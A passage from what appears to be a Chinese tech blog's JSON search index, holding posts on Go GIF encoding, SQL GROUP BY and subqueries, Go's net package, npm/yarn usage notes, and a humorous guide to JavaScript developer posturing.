palette.Plan9)\n\n    draw.Draw(p1, p1.Bounds(), g, image.ZP, draw.Src) //添加图片\n\n    p2 := image.NewPaletted(image.Rect(0, 0, 200, 200), palette.Plan9)\n    draw.Draw(p2, p2.Bounds(), g2, image.ZP, draw.Src) //添加图片\n\n    g1 := \u0026gif.GIF{\n        Image:     []image.Paletted{p1, p2},\n        Delay:     []int{30, 30},\n        LoopCount: 0,\n    }\n\n    gif.EncodeAll(w, g1)  \n    gif.EncodeAll(f1, g1)\n}\n\n得到的gif图片如下所示：\n","tags":null},{"location":"//blog.pytool.com/Post/数据库/2016-02-29 可以这样理解Group by和聚合函数","title":"可以这样去理解group by和聚合函数","text":"http://www.tuicool.com/articles/yamUn2I\n\n写在前面的话：用了好久group by，今天早上一觉醒来，突然感觉group by好陌生，总有个筋别不过来，为什么不能够select  from Table group by id，为什么一定不能是，而是某一个列或者某个列的聚合函数，group by 多个字段可以怎么去很好的理解呢？不过最后还是转过来了，简单写写吧，大牛们直接略过吧。\n\n正文开始===========\n\n先来看下表1，表名为test：\n\n表1\n\n执行如下SQL语句：\n\nSELECT name FROM test\nGROUP BY name\n\n你应该很容易知道运行的结果，没错，就是下表2：\n\n表2\n\n可是为了能够更好的理解 “group by”多个列“ 和 ”聚合函数“ 的应用，我建议在思考的过程中，由表1到表2的过程中，增加一个虚构的中间表： 虚拟表3 。下面说说如何来思考上面SQL语句执行情况：\n\n1.FROM test：该句执行后，应该结果和表1一样，就是原来的表。\n\n2.FROM test Group BY name：该句执行后，我们想象生成了 虚拟表3， 如下所图所示，生成过程是这样的：group by name，那么找name那一列，具有相同name值的行，合并成一行，如对于name值为aa的，那么1 aa 2与2 aa 3两行合并成1行，所有的id值和number值写到一个单元格里面。\n\n3.接下来就要针对 虚拟表3 执行Select语句了：\n\n（1）如果执行select 的话，那么返回的结果应该是虚拟表3，可是id和number中有的单元格里面的内容是多个值的，而关系数据库就是基于关系的，单元格中是不允许有多个值的，所以你看，执行select  语句就报错了。\n\n（2）我们再看name列，每个单元格只有一个数据，所以我们select name的话，就没有问题了。为什么name列每个单元格只有一个值呢，因为我们就是用name列来group by的。\n\n（3）那么对于id和number里面的单元格有多个数据的情况怎么办呢？答案就是用 聚合函数，聚合函数就用来输入多个数据，输出一个数据的。 如cout(id)，sum(number)，而每个聚合函数的输入就是每一个多数据的单元格。\n\n（4）例如我们执行select name,sum(number) from test group by name，那么sum就对虚拟表3的number列的每个单元格进行sum操作，例如对name为aa的那一行的number列执行sum操作，即2+3，返回5，最后执行结果如下：\n\n（5）group by 多个字段该怎么理解呢：如group by name,number，我们可以把name和number 看成一个 整体字段 ，以他们整体来进行分组的。如下图\n\n（6）接下来就可以配合select和聚合函数进行操作了。如执行select name,sum(id) from test group by name,number，结果如下图：\n\n至此，我已经对我自己对如此简单的问题有如此天马行空的想法所折服，洗洗睡觉。","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/net_socket","title":"golang中net包用法(三)--TCP和UDP以及Unix domain socket","text":"chenbaoke的专栏\n\ngolang中net包用法(三)--TCP和UDP以及Unix domain socket\n\ntype TCPAddr  //表示TCP终端地址\n\n    type TCPAddr struct {\n        IP   IP\n        Port int\n        Zone string // IPv6寻址范围\n    }\n\nfunc ResolveTCPAddr(net, addr string) (\\TCPAddr, error)//将一个地址解析成TCP地址形式,形如\"host:port\"或 \"\\[ipv6-host%zone\\]:port\",解析得到网络域名和端口名.其中net必须是\"tcp\",\"tcp4\"或者\"tcp6\",IPv6地址字面值/名称必须用方括号包起来，如\"\\[::1\\]:80\"、\"\\[ipv6-host\\]:http\"或\"\\[ipv6-host%zone\\]:80\".\n\nfunc (a \\TCPAddr) Network() string  //返回地址的网络类型,\"tcp\"\nfunc (a \\TCPAddr) String() string\n\ntype TCPConn//TCPConn是TCP网络连接,其实现了Conn接口,其中方法大部分与IPConn相同,这里不再赘述.\nfunc DialTCP(net string, laddr, raddr \\TCPAddr) (\\TCPConn, error)\nfunc (c \\TCPConn) Close() error\nfunc (c \\TCPConn) CloseRead() error\nfunc (c \\TCPConn) CloseWrite() error\nfunc (c \\TCPConn) File() (f \\os.File, err error)\nfunc (c \\TCPConn) LocalAddr() Addr\nfunc (c \\TCPConn) Read(b \\[\\]byte) (int, error)\nfunc (c \\TCPConn) ReadFrom(r io.Reader) (int64, error)\nfunc (c \\TCPConn) RemoteAddr() Addr\nfunc (c \\TCPConn) SetDeadline(t time.Time) error\nfunc (c \\TCPConn) SetKeepAlive(keepalive bool) error //设置操作系统是否应该在该连接中发送keepalive信息\nfunc (c \\TCPConn) SetKeepAlivePeriod(d time.Duration) error //设定keepalive的生存周期\nfunc (c \\TCPConn) SetLinger(sec int) error //SetLinger设定一个连接的关闭行为当该连接中仍有数据等待发送或者确认.如果sec\u0026lt;0(默认形式),操作系统将在后台完成发送数据操作;如果sec==0,操作系统将任何未发送或者未确认的数据丢弃;当sec\u0026gt;0,数据将在后台进行发送,这点和sec\u0026lt;0时效果一致.然而,在一些操作系统中,当sec秒之后,系统将任何未发送的数据丢弃.\nfunc (c \\TCPConn) SetNoDelay(noDelay bool) error//控制是否操作系统为了发送更少的数据包(Nagle's算法)而延迟数据包的发送,默认值是true(不延迟),这意味着数据将在写后尽可能快的进行发送,而不是延迟发送.\nfunc (c \\TCPConn) SetReadBuffer(bytes int) error //设定操作系统对于conn连接接受缓存的大小\nfunc (c \\TCPConn) SetReadDeadline(t time.Time) error//设定读超时时间\nfunc (c \\TCPConn) SetWriteBuffer(bytes int) error//设定操作系统对于conn连接发送缓存的大小\nfunc (c \\TCPConn) SetWriteDeadline(t time.Time) error//设定发送超时时间\nfunc (c \\TCPConn) Write(b \\[\\]byte) (int, error)//实现了write接口方法\n\ntype TCPListener//TCP监听器,客户端应该使用不同类型的监听,而不是默认的TCP\n\nfunc ListenTCP(net string, laddr \\TCPAddr) (\\TCPListener, error)//声明Tcp地址laddr并且返回一个tcp listener,其中net必须是tcp,tcp4或者tcp6,如果laddr端口是0,则ListenTcp将选择一个可用的端口,调用者可以利用TCPListener的addr方法来获取该地址.\nfunc (l \\TCPListener) Accept() (Conn, error)//实现listener接口的accept方法,它等待下次调用并返回一个连接\nfunc (l \\TCPListener) AcceptTCP() (\\TCPConn, error)//接受下一次调用,并返回一个新的连接\nfunc (l \\TCPListener) Addr() Addr//返回listener的网络地址,TCPAddr\nfunc (l \\TCPListener) Close() error  //停止监听TCP地址,已经建立的连接不被关闭\nfunc (l \\TCPListener) File() (f \\os.File, err error)//返回底层os.File的一个副本,设定为阻塞模式,调用者需要关闭文件当完毕后,关闭l不影响文件副本f,并且关闭文件副本f也不影响tcplistener l,返回的文件句柄不同于原来网络连接的文件,通过这个副本来改变原来的文件属性可能起作用也可能不起作用.\n\nfunc (l \\TCPListener) SetDeadline(t time.Time) error//设定监听者的超时时间,如果时间设置为0,则禁用超时设置,即永远不会超时.\n\ntype UDPAddr  //代表一个udp端口的地址\n\ntype UDPAddr struct {\n        IP   IP\n        Port int\n        Zone string // IPv6 寻址范围\n}\n\nfunc ResolveUDPAddr(net, addr string) (\\UDPAddr, error)  //将addr作为UDP地址解析并返回。参数addr格式为\"host:port\"或\"\\[ipv6-host%zone\\]:port\"，解析得到网络名和端口名；net必须是\"udp\"、\"udp4\"或\"udp6\"。IPv6地址字面值/名称必须用方括号包起来，如\"\\[::1\\]:80\"、\"\\[ipv6-host\\]:http\"或\"\\[ipv6-host%zone\\]:80\"。\nfunc (a \\UDPAddr) Network() string//返回地址的网络名\"udp\"\nfunc (a \\UDPAddr) String() string//UDPAddr的字符化形式表示\n\ntype UDPConn  //实现了udp网络连接,它实现了conn和packetconn的接口\nfunc DialUDP(net string, laddr, raddr \\UDPAddr) (\\UDPConn, error)//连接网络上的远程地址raddr,其中net必须是udp,udp4或者udp6,如果laddr不是空,则使用本地地址用于连接\nfunc ListenMulticastUDP(net string, ifi \\Interface, gaddr \\UDPAddr) (\\UDPConn, error)//监听在ifi的组地址gaddr上的多播udp包,ifi指定了加入的接口,如果ifi是空的话,则使用默认的多播接口\nfunc ListenUDP(net string, laddr \\UDPAddr) (\\UDPConn, error)//监听绑定在本地地址laddr上的udp包,其中net必须是udp,udp4或者udp6,如果laddr是端口0的话,则listenudp将选择一个可用的port端口,使用udpconn的LocalAddr方法能够发现这个port端口,返回的udpconn的ReadFrom和WriteTo方法能够用来接受和发送udp包.\nfunc (c \\UDPConn) Close() error//关闭连接\nfunc (c \\UDPConn) File() (f \\os.File, err error)//与TCPConn中File()方法类似\nfunc (c \\UDPConn) LocalAddr() Addr//返回本地网络地址\nfunc (c \\UDPConn) Read(b \\[\\]byte) (int, error)\nfunc (c \\UDPConn) ReadFrom(b \\[\\]byte) (int, Addr, error)\nfunc (c \\UDPConn) ReadFromUDP(b \\[\\]byte) (n int, addr \\UDPAddr, err error)//从c中读取一个包,将有效负载写入b中返回写入的byte数以及包的地址.ReadFromUdp可以设置为超时.\nfunc (c \\UDPConn) ReadMsgUDP(b, oob \\[\\]byte) (n, oobn, flags int, addr \\UDPAddr, err error)//ReadMsgUDP从c读取一个数据包，将有效负载拷贝进b，相关的带外数据拷贝进oob，返回拷贝进b的字节数，拷贝进oob的字节数，数据包的flag，数据包来源地址和可能的错误。\nfunc (c \\UDPConn) RemoteAddr() Addr//返回远程的网络地址\nfunc (c \\UDPConn) SetDeadline(t time.Time) error //实现conn的超时方法,设置udpconn的超时\nfunc (c \\UDPConn) SetReadBuffer(bytes int) error\nfunc (c \\UDPConn) SetReadDeadline(t time.Time) error\nfunc (c \\UDPConn) SetWriteBuffer(bytes int) error\nfunc (c \\UDPConn) SetWriteDeadline(t time.Time) error\nfunc (c \\UDPConn) Write(b \\[\\]byte) (int, error)\nfunc (c \\UDPConn) WriteMsgUDP(b, oob \\[\\]byte, addr \\UDPAddr) (n, oobn int, err error)//WriteMsgUDP通过c向地址addr发送一个数据包，b和oob分别为包有效负载和对应的带外数据，返回写入的字节数（包数据、带外数据）和可能的错误。\nfunc (c \\UDPConn) WriteTo(b \\[\\]byte, addr Addr) (int, error)\nfunc (c \\UDPConn) WriteToUDP(b \\[\\]byte, addr \\UDPAddr) (int, error) //通过c将一个udp包写入addr,其中需要从b中复制有效负载.WriteToUDP也可以设置超时时间\n\ntype UnixAddr  //代表一个Unix域名的socket终端地址\n\ntype UnixAddr struct {\n        Name string\n        Net  string\n}\n\nfunc ResolveUnixAddr(net, addr string) (\\UnixAddr, error) //将addr解析成UnixAddr,net指的是网络名称,为unix,unixgram或者unixpacket\nfunc (a \\UnixAddr) Network() string  //返回网络名称,unix,unixgram或者unixpacket\nfunc (a \\UnixAddr) String() string  //UnixAddr的字符形式表示\n\ntype UnixConn//UnixConn是Unix域名socket的网络连接\nfunc DialUnix(net string, laddr, raddr \\UnixAddr) (\\UnixConn, error)//在网络协议net上连接本地地址laddr和远端地址raddr.其中net是\"unix\"、\"unixgram\"、\"unixpacket\"，如果laddr不是nil将使用它作为本地地址。\nfunc ListenUnixgram(net string, laddr \\UnixAddr) (\\UnixConn, error)//监听绑定到本地地址laddr的数据包,span style=\"color:#FF0000\"其中net必须是unixgram/span,返回连接的ReadFrom和WriteTo方法能够用来接受和发送地址包\nfunc (c \\UnixConn) Close() error//关闭连接\nfunc (c \\UnixConn) CloseRead() error//关闭连接的读操作,大多数情况下使用Close\nfunc (c \\UnixConn) CloseWrite() error//关闭连接的写操作,大多数情况下使用Close\nfunc (c \\UnixConn) File() (f \\os.File, err error)//\nfunc (c \\UnixConn) LocalAddr() Addr\nfunc (c \\UnixConn) Read(b \\[\\]byte) (int, error)\nfunc (c \\UnixConn) ReadFrom(b \\[\\]byte) (int, Addr, error)\nfunc (c \\UnixConn) ReadFromUnix(b \\[\\]byte) (n int, addr \\UnixAddr, err error)\nfunc (c \\UnixConn) ReadMsgUnix(b, oob \\[\\]byte) (n, oobn, flags int, addr \\UnixAddr, err error)\nfunc (c \\UnixConn) RemoteAddr() Addr\nfunc (c \\UnixConn) SetDeadline(t time.Time) error\nfunc (c \\UnixConn) SetReadBuffer(bytes int) error\nfunc (c \\UnixConn) SetReadDeadline(t time.Time) error\nfunc (c \\UnixConn) SetWriteBuffer(bytes int) error\nfunc (c \\UnixConn) SetWriteDeadline(t time.Time) error\nfunc (c \\UnixConn) Write(b \\[\\]byte) (int, error)\nfunc (c \\UnixConn) WriteMsgUnix(b, oob \\[\\]byte, addr \\UnixAddr) (n, oobn int, err error)\nfunc (c \\UnixConn) WriteTo(b \\[\\]byte, addr Addr) (n int, err error)\nfunc (c \\UnixConn) WriteToUnix(b \\[\\]byte, addr \\UnixAddr) (n int, err error)\n\ntype UnixListener//表示一个Unix域名socket监听者,客户端应该使用指定的不同类型的listener而不是使用默认的unix domain socket\nfunc ListenUnix(net string, laddr \\UnixAddr) (\\UnixListener, error) //利用Unix domain socket的laddr创建一个unix监听者,这个网络必须是unix或者unixpacket\nfunc (l \\UnixListener) Accept() (c Conn, err error)//\nfunc (l \\UnixListener) AcceptUnix() (\\UnixConn, error)\nfunc (l \\UnixListener) Addr() Addr\nfunc (l \\UnixListener) Close() error\nfunc (l \\UnixListener) File() (f \\os.File, err error)\nfunc (l \\*UnixListener) SetDeadline(t time.Time) (err error)\nBugs\n\n在任何POSIX平台上，使用ReadFrom或ReadFromIP方法从\"ip4\"网络读取数据时，即使有足够的空间，都可能不会返回完整的IPv4数据包，包括数据包的头域。即使Read或ReadMsgIP方法可以返回完整的数据包，也有可能出现这种情况。因为对go 1的兼容性要求，这个情况无法被修正。因此，如果必须获取完整数据包时，建议不要使用这两个方法，请使用Read或ReadMsgIP代替。\n\n在OpenBSD系统中，在\"tcp\"网络监听时不会同时监听IPv4和IPv6连接。 因为该系统中IPv4通信不会导入IPv6套接字中。如果有必要的话,请使用两个独立的监听。\n\n参考：\n\nhttp://docscn.studygolang.com/pkg/net/#pkg-constants","tags":null},{"location":"//blog.pytool.com/Post/2016-06-01 Linux命令 node\u0026yarn","title":"工具软件 node yarn","text":"---\nnode \u0026 npm 自用前端实用工具总结\n\n 1 起步\n\n1.1 安装 nodeJs \u0026 npm\n初次可直接从官网下载安装(内含最新版的 nodejs 和 npm) https://nodejs.org\n\n 1.2 管理 nodeJs 版本\n安装 n 模块\n        $ sudo npm install -g n\n    \n升级 nodeJs\n        # Use or install the latest official release:\n    $ n latest\n\n    # Use or install the stable official release:\n    $ n stable\n\n    # Use or install the latest LTS official release:\n    $ n lts\n    \n切换 nodeJs 版本\n        $ n\n\n      4.6.0\n    ο 6.8.0\n    \n删除 nodeJs 版本\n        $ n rm 0.9.4\n    \nn 模块 github 地址：https://github.com/tj/n\n\n注意：windows 系统不适用以上方法\n    windows 直接在官网下载最新版本，覆盖安装来升级 nodeJs 版本\n    win10自带的 Ubuntu bash 代码行也可以试一下（未测试过）\n\n1.3 MAC系统 npm 需要管理员权限问题(未测试)\n$ sudo chown -R $USER /usr/local   \n\n 1.4 win使用nvm-windows安装\u0026管理node版本\n安装nvm-windows\n在命令行输入nvm验证安装成功\n常用命令\n\n        # 查看已安裝的Node版本\n    $ nvm list\n\n    # 查看提供哪些Node版本\n    $ nvm list available\n\n    # 安裝指定的Node版本\n    $ nvm install [version]\n\n    # 指定使用Node版本\n    $ nvm use [version]\n    \n2 管理 npm 模块管理器\n 2.1 升级 npm 的版本\n通用\n        $ npm install npm@latest -g\n    \nwindows 平台插件： npm-windows-upgrade\n        $ npm i -g npm-windows-upgrade\n    $ npm-windows-upgrade\n    \n2.2 升级 npm 依赖包\nnpm-check是用来检查npm依赖包是否有更新、错误以及是否在使用的，可以方便的使用npm-check进行包的更新\n\n安装npm-check\n\n        $ npm install -g npm-check\n    \n检查全局的 npm 包是否可升级\n\n        $ npm-check -u -g\n    \n 2.3 淘宝NPM镜像cnpm (不推荐，用yarn代替)\n安装cnpm\n\n        $ npm install -g cnpm --registry=https://registry.npm.taobao.org\n    \n用cnpm安装模块\n\n        $ cnpm install [name]\n    \n2.4 npm 个人常用命令\n 查看 npm 的版本\n$ npm -v\n\n为npm init设置默认值\n$ npm set init-author-name 'cycjimmy'\n$ npm set init-author-email 'cycjimmy@gmail.com'\n$ npm set init-author-url 'https://github.com/cycjimmy'\n$ npm set init-license 'MIT'\n\n 初始化生成一个package.json文件。\n使用 -y 可以跳过提问阶段，直接生成package.json文件\n$ npm init -y\n\n 列出当前项目安装的所有模块包\n$ npm ls --depth=0\n\nnpm install默认会安装dependencies字段和devDependencies字段中的所有依赖包\n$ npm i\n 针对国内可以加上参数\n$ npm --registry=https://registry.npm.taobao.org i\n\n安装依赖包\n –save：添加到dependencies，可简化为-S\n–save-dev: 添加到devDependencies，可简化为-D\n$ sudo npm i -g [package name]\n$ npm i [package name]\n$ npm i [package name] -S\n$ npm i [package name] -D\n\n 更新依赖包\n-S表示保存新的依赖包版本号到package.json\n$ npm update package name -S\n npm update只更新顶层依赖包，而不更新依赖的依赖，如果想递归更新取，使用下面的命令\n$ npm --depth 9999 update\n\n卸载依赖包\n$ npm uninstall [package name]\n$ npm uninstall [package name] -global\n\n 执行任务\n$ npm run [task name]\n\n针对国内的设置\n$ npm config set registry=http://registry.npmjs.org\n\n 使用XX-Net的可设置下http代理\n$ npm config set proxy http://127.0.0.1:8087\n$ npm config set https-proxy http://127.0.0.1:8087\n$ npm config set strict-ssl false -g\n\n还原设置\n$ npm config delete registry\n$ npm config delete proxy\n$ npm config delete https-proxy\n$ npm config delete strict-ssl\n\n 列出所有npm配置项目\n$ npm config ls -l\n\nstrict-ssl 需手动修改 .npmrc 文件(located in \\Users\\ in Windows)\n        # .npmrc文件中添加\n    strict-ssl=false\n    \n其他比较详细的npm命令查看 \n\n2.5 用yarn取代npm\nYarn is a package manager for your code.\n\n安装(升级)yarn\n\n        $ npm install -g yarn\n    \nyarn常用命令\n         npm init =  $ yarn init\n\n    # npm install =  $ yarn install\n    $ yarn install --force     #强制所有包重新下载\n\n    # npm install --save [package] =  $ yarn add [package]\n\n    # npm install --save-dev [package] =  $ yarn add [package] --dev\n\n    # npm install --global [package] =  $ yarn global add [package]\n\n    # rm -rf node_modules \u0026\u0026 npm install =  $ yarn upgrade [package]\n    $ yarn upgrade [package] --ignore-engines  #忽略引擎\n\n    # npm uninstall --save [package] =  # npm uninstall --save-dev [package] =  $ yarn remove [package]\n\n    # npm cache clean =  $ yarn cache clean\n\n    # 针对国内的设置\n    $ yarn config set registry https://registry.npm.taobao.org\n\n    # 使用XX-Net的可设置下http代理\n    $ yarn config set proxy http://127.0.0.1:8087\n    $ yarn config set https-proxy http://127.0.0.1:8087\n    $ yarn config set strict-ssl false -g\n\n    # 还原设置\n    $ yarn config delete registry\n    $ yarn config delete proxy\n    $ yarn config delete https-proxy\n    $ yarn config delete strict-ssl\n    \n  yarn的 strict-ssl 配置目前存在BUG，需手动修改 .yarnrc 文件(located in \\Users\\ in Windows)【yarn/issues#980】\n        # 进入vi修改.yarnrc\n    $ vi ~/.yarnrc\n\n    # .yarnrc内容:\n    #","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-03-29 前端JSer装逼手册","title":"前端JSer装逼手册","text":"在装逼成本越来越高的JS圈，是时候充值一下了 ———— 题记\n\n开发\n\nMacbook Pro是标配，美其名曰“提高开发体验”\n\n什么？你还在用Spotlight？赶紧给我换Alfred！\n\n编辑器，Sublime / Atom / VS Code 三选一\n\n虽然很想用IDE，但一定要忍住，并且与人解释道：\n\n“启动速度慢，消耗资源多，不适合我这种完美主义者\n\n如果不是为了美观，我宁愿使用 Vim / Emacs”\n\n命令行iTerm2 + Oh-my-zsh\n\n二逼青年用bash，普通青年用zsh\n\n我们也只是想做一名普通人罢了\n\n查资料虽然都是百度\n\n但一定要称都是用Google\n\n且要说英文而不是中文的“谷歌”\n\n使用美式发音，当自己是湾区老司机\n\n尽管四级飘过，六级没过\n\n在Stack Overflow上点数也低\n\n但也要说每天都与各国程序员谈笑风生\n 语言\n\n这年头如果还不用Babel + ES6\n\n都不好意思说自己是JSer\n\n当然还有 TypeScript / CoffeeScript / Dart …\n\n没学过没关系\n\n对外人说自己“略懂”即可\n\n反正最后都是编译为ES5，你懂的\n\n为了避免对方深入问\n\n此时你应该继续发表高见：\n\n“JS是基于原型的函数式弱类语言\n\n引入类与强类真的是不伦不类”\n\n说到此，顿一下，表现出百感交集\n\n随后继续徐徐道：\n\n“可大势所趋，吾等小辈惟随波逐流”\n\n说罢，即可挥挥衣袖转身离去\n\n    在这里不得不提一下，虽然使用Bable转码可以尽情装逼\n\n    但其对某些新特性的转换相当二逼（详情请看这篇文章）\n\n    一句话：Babel虽好，但别贪杯哦（推荐Babel在线实时编译）\n\n代码风格\n\n摒弃JSLint / JSHint / JSCS，拥抱ESLint\n\n尽管平时只是个搬砖的\n\n但时刻以世界顶级企业的规范约束自己\n\n于是eslint-config-airbnb成了我们的标配\n\n一般新手是这样写的：\n/ Low /\nif (a) {\n  return b;\n} else {\n  return c;\n}\n逼格稍微高一点的这样写：\n/ Bigger /\nif (a) return b; // 提前结束，免用大括号与else\nreturn c;\n实际上还能更进一步：\n/ Bigger than bigger /\n① return a ? b : c // 不要写分号，留白予人想象的空间\n② return a \u0026\u0026 b || c\n总而言之，代码越短，可读性越差，逼格越高\n\n不能让人随便看懂，就像人不能轻易让人看透\n 奇技淫巧\n\n    罄竹难书\n\n常用库\nDOM库\n\n标配是jQuery，手机端有Zepto作为替代品\n\n想要装逼且不怕坑，那就上Mootools\n\nPrototype？嗯，复古的逼格都是很高的\n\n一定要说自己纯粹为了优雅简洁，不得不用jQuery\n\n（如何做到jQuery-free，请看这篇文章）\n\n当然，就算是写jQuery\n\n也能体现出逼格\n\n我们来看看新手一般是怎么写的：\n/ Low /\nvar value = $(\".container .myInput1\").val();\n$(\".container .myInput2\").val(value);\n$(\".container .myInput3\").attr(\"disabled\", \"disabled\");\n用双引号，以及对选择器性能认知不足，是新手的特征\n\n一般直接使用类选择器的，都是对用户体验很有自信的\n/ Bigger /\n// 把div.container命名为myDiv\nvar $myDiv = $('myDiv'), // 缓存DOM\n  v = $myDiv.find('.myInput1').val();\n\n$myDiv\n  .find('.myInput2').val(v)\n  .end() // 坚持链式调用\n  .find('.myInput3').attr('disabled', 'disabled');\n（有关jQuery选择器的性能以及最佳实践，请看这篇文章）\nUI\n\nBootStrap烂大街\n\n不是我们的菜\n\n我们选择的标准是门槛要高\n\n于是\n\nFoundation6 / Ant Design\n\n映入眼帘\n\n请谨慎使用\n\nSemantic UI / UIkit / Amaze UI …\n\n避免不能自拔\n工具库\n\n后浪lodash把前浪underscore拍死在沙滩上\n\n于是它成了唯一的选择\n\n不过为了保持逼格\n\n我们要尽量使用原汁原味的ES6\n\n就算要用也一定要注意素质：\n/ Low /\nimport _ from 'lodash' // 把整个lodash打包进去了\n\n/ Bigger /\nimport isEmpty from 'lodash/isEmpty' // 仅把个别函数打包\n模板引擎\n\n逼格最高显然是Jade\n\n但改名为Pug（哈巴狗）后\n\n就像是小龙女被尹志平不可描述后\n\n再也无爱了\n\n从此以后\n\n留了胡子（Mustache）\n\n扶着把手（Handlebars）\n\n默默耕耘\n异步编程\n\n这里不谈 Q / Bluebird / Async / co / then 等库\n\n皆因Babel已经支持所有的异步编程解决方案\n\n当前最常用的还是Promise\n\n有些新手会写出这种代码：\n/ Low /\n// 找出与用户1同市的所有用户\nUser.findById(1).then((user) =  {\n  User.find({ city: user.city }).then((users) =  {\n    res.json(users.toJSON())\n  })\n})\n这属于Promise反模式，与回调函数无异\n/ Bigger /\nUser.findById(1).then((user) =  {\n  return User.find({ city: user.city }) // 返回Promise\n}).then((users) =  {\n  res.json(users.toJSON())\n}).catch(next)\n包管理工具\n\n如果你被\n\nBower / spm / Component / Duo …\n\n坑过\n\n请回到npm的怀抱\n\n什么？jspm？有完没完…\n 构建工具\n\n想当年我不懂什么是自动构建工具\n\n他们说：生命苦短，我们用Grunt\n\n好不容易用上Grunt的时候\n\n他们又说：Gulp基于流，符合Unix哲学\n\n之后我虔诚地换上了Gulp\n\n他们双说：Webpack最好用\n\n最后终于用上了Webpack\n\n他们叒说：FIS3约不约？。。。\n模块化方案\n\n无论是\n\n    RequireJS (AMD)\n    SeaJS (CMD)\n    KMD.js (KMD)\n    Browserify (CommonJS)\n    …\n\n最后都庆幸回归到npm + Webpack\n\n什么？SystemJS？有完没完…\n MV*框架 / 技术栈 / 大型框架\nBackbone\n\n每个人都有一段不堪回首的经历\n\n就像当年在QQ空间发“你若安好便是晴天”的说说\n\nBackbone就是这样子的存在\nAngular\n\n一定要边吐槽边用，不然就一点都不ng了\n\n“学习曲线陡峭”不应从你口中说出\n\n“学习过程趣味盎然”才是你的菜\nVue\n\n一定要用“优雅”来形容\n\n就像用ES6一定要“大胆”\nReact技术栈\n\nReact已经是前端高逼格的代名词\n\n所以无论懂不懂都要喊：\n\n“React大法好”\n\n因为这是一种信仰\n\n称赞JSX的标新立异\n\n谈谈 Flux / Redux\n\n扯扯 Elm / RxJS\n\n每到深入则戛然而止：\n\n“太深入的太抽象，你们未必能理解”\n\n由此，听者只会更加崇拜你\n其他\n\n还有国内相对小众的 Ember / Knockout / Avalon\n\n（请别再把 YUI / Dojo / Ext / KISSY 扯进来了好伐）\n混合 / 原生开发\n\n自从PhoneGap出来后\n\n貌似我们也能抢安卓/iOS的饭碗了\n\nIonic更是将Hybrid APP推向高潮\n\n不过混合始终比不上原生\n\n于是React Native应运而生\n\n最近多了一个新的选择：Weex\n\n别忘了还有桌面的nw.js以及Electron\n\n    JSer从一入门开始，就掌握了改变世界的能力\n\n    也比其他程序员更容易走向人生的巅峰\n\n 后端框架\n\n我们一直标榜自己是全栈\n\n不玩几下后端框架怎么行\n\n快递员用Express\n\n风湿患者用Koa\n\n哲学家用ThinkJS\n\n水手用Sails\n\n还有全栈的Meteor\n\n上述都用一遍\n\n相信也快转行了\n服务器进程管理\n\n既然都玩上了后端框架\n\n不懂部署服务器怎么行\n\n二逼青年用supervisor / nodemon\n\n文艺青年用forever\n\n普通青年用pm2\n\n装逼青年用Tmux + node\n 结语\n\nimport you, { isGoodPost, star } from 'you'\n\nimport me, { thank } from 'me'\n\nconst url = 'https://github.com/kenberkeley/bigger-jser'\n\nisGoodPost(url) \u0026\u0026 star(me)\n\nthank(you)","tags":null},{"location":"//blog.pytool.com/Post/数据库/2017-04-24 sql中子查询IN，EXISTS，ANY，ALL，SOME，UNION关键字","title":"msyql中子查询IN，EXISTS，ANY，ALL，SOME，UNION关键字介绍","text":"---\n\nmsyql中子查询IN，EXISTS，ANY，ALL，SOME，UNION介绍\n\nANY关键字\n\n假设any内部的查询语句返回的结果个数是三个，如:result1,result2,result3,那么，\n\nselect ...from ... where a   any(...);\n-  等价于\nselect ...from ... where a   result1 or a   result2 or a   result3;\n\nALL关键字\n\nALL关键字与any关键字类似，只不过上面的or改成and。即:\n\nselect ...from ... where a   all(...);\n\n-  等价于\n\nselect ...from ... where a   result1 and a   result2 and a   result3;\nSOME关键字\n\nsome关键字和any关键字是一样的功能。所以:\n\nselect ...from ... where a   some(...);\n-  等价于\nselect ...from ... where a   result1 or a   result2 or a   result3;\n\nIN关键字 = ANY\n\nIN运算符用于WHERE表达式中，以列表项的形式支持多个选择，语法如下：\n\n　　WHERE column IN (value1,value2,...)\n　　WHERE column NOT IN (value1,value2,...)\n当 IN 前面加上 NOT运算符时，表示与 IN 相反的意思，即不在这些列表项内选择。代码如下:\n\n查询\nSELECT ID,NAME FROM A WHERE　ID IN (SELECT AID FROM B)             //查询B表中AID的记录\nSELECT ID,NAME FROM A WHERE　ID　NOT IN (SELECT AID FROM B)        //意思和上面相反\n删除\ndelete from articles where id in (1,2,3);                         //删除id=1,id=2,id=3的记录\ndelete from articles where id not in (1);                         //删除id!=1的记录\n\n词语IN是\"＝ANY\"的别名。因此，这两个语句是一样的：\n\nSELECT s1 FROM t1 WHERE s1 = ANY (SELECT s1 FROM t2);\nSELECT s1 FROM t1 WHERE s1 IN    (SELECT s1 FROM t2);\n\nEXISTS关键字\n   当EXISTS结果为真时执行查询\nMySQL EXISTS 和 NOT EXISTS 子查询语法如下：\n\n　　SELECT ... FROM table WHERE  EXISTS (SUBquery)\n该语法可以理解为：将主查询的数据，放到子查询中做条件验证，根据验证结果（TRUE 或 FALSE）来决定主查询的数据结果是否得以保留。\n\n SELECT  FROM employee  WHERE EXISTS (SELECT dname FROM department WHERE did=1004);\nEmpty set (0.00 sec)\n\n此处内层循环并没有查询到满足条件的结果，因此返回false，外层查询不执行。\n\nNOT EXISTS刚好与之相反\n\n当然，EXISTS关键字可以与其他的查询条件一起使用，条件表达式与EXISTS关键字之间用AND或者OR来连接，如下：\n\n SELECT  FROM employee WHERE age  24 AND EXISTS (SELECT dname FROM department WHERE did=1003);\n\n提示：\n•EXISTS (SUBquery) 只返回 TRUE 或 FALSE，因此子查询中的 SELECT * 也可以是 SELECT 1 或其他，官方说法是实际执行时会忽略 SELECT 清单，因此没有区别。\nSELECT EXISTS (SELECT TRUE FROM follows WHERE followerid = $1 AND followeeid = $2)\n•EXISTS 子查询的实际执行过程可能经过了优化而不是我们理解上的逐条对比，如果担忧效率问题，可进行实际检验以确定是否有效率问题。\n•EXISTS 子查询往往也可以用条件表达式、其他子查询或者 JOIN 来替代，何种最优需要具体问题具体分析\n\nUNION关键字\n\nMySQL UNION 用于把来自多个 SELECT 语句的结果组合到一个结果集合中。语法为：\n\n　　SELECT column,... FROM table1\n　　UNION [ALL]\n　　SELECT column,... FROM table2\n　　...\n\n在多个 SELECT 语句中，对应的列应该具有相同的字段属性，且第一个 SELECT 语句中被使用的字段名称也被用于结果的字段名称。\nUNION 与 UNION ALL 的区别\n\n当使用 UNION 时，MySQL 